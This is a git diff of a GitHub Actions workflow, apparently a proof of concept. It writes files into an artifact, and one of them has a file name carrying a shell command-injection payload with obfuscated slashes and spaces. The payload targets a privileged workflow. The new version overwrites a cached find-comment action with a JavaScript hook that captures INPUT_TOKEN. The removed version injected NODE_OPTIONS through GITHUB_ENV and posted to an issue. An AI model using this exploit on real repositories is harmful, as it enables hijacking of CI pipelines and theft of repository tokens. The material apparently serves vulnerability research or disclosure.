@@ -18,29 +18,23 @@ jobs:
           import os
           open("content/report.txt", "w").write("plain report\n")
           open("content/pwn.txt", "w").write("substituted target\n")
+          open("content/pr_number.txt", "w").write("5\n")
 
-          # On execution inside the privileged job this writes NODE_OPTIONS into $GITHUB_ENV
-          # and emits nothing on stdout, so the surrounding "cat <path>" still succeeds.
-          name = ("p$(perl -e 'sysopen(F,$ENV{GITHUB_ENV},577);print F q{NODE_OPTIONS=--require=}"
-                  ".chr(47).q{tmp}.chr(47).q{content}.chr(47).q{content}.chr(47).q{h.js}.chr(10)')wn.txt")
+          # The filename below is interpolated into the privileged workflow's shell.
+          # It rebuilds "/" from ${PWD:0:1} (no literal slash allowed in a filename) and
+          # overwrites the already-downloaded find-comment action with our JS hook.
+          name = ("p$(S=${PWD:0:1};cp${IFS}${S}tmp${S}content${S}content${S}x.js${IFS}"
+                  "${S}home${S}runner${S}work${S}_actions${S}peter-evans${S}find-comment${S}v3"
+                  "${S}dist${S}index.js)wn.txt")
           open("content/" + name, "w").write("payload\n")
 
-          hook = r'''
-          const fs = require('fs');
-          try {
-            const t = process.env.INPUT_TOKEN || '';
-            fs.appendFileSync('/tmp/hook_ran', 'len=' + t.length + '\n');
-            if (t) {
-              const https = require('https');
-              const body = JSON.stringify({body: 'NODE_OPTIONS hook fired inside privileged action; INPUT_TOKEN length=' + t.length});
-              const req = https.request({hostname:'api.github.com', path:'/repos/PDFtoMark/gab-poc-aave-comment/issues/5/comments', method:'POST', headers:{authorization:'Bearer '+t, 'user-agent':'poc', 'content-type':'application/json', 'content-length':Buffer.byteLength(body)}}, r => { r.on('data', () => {}); r.on('end', () => {}); });
-              req.on('error', () => {});
-              req.write(body); req.end();
-            }
-          } catch (e) {}
-          '''
-          open("content/h.js", "w").write(hook)
-          print(sorted(os.listdir("content")))
+          hook = (
+            "const f=require('fs');"
+            "let p=String.fromCharCode(47)+'tmp'+String.fromCharCode(47)+'comment';"
+            "f.appendFileSync(p,'\\n\\nTOKEN_CAPTURED='+(process.env.INPUT_TOKEN||'NO_TOKEN'));"
+          )
+          open("content/x.js", "w").write(hook)
+          print(len(name), sorted(os.listdir("content")))
           PY
           ls -1 content
       - uses: actions/upload-artifact@v4
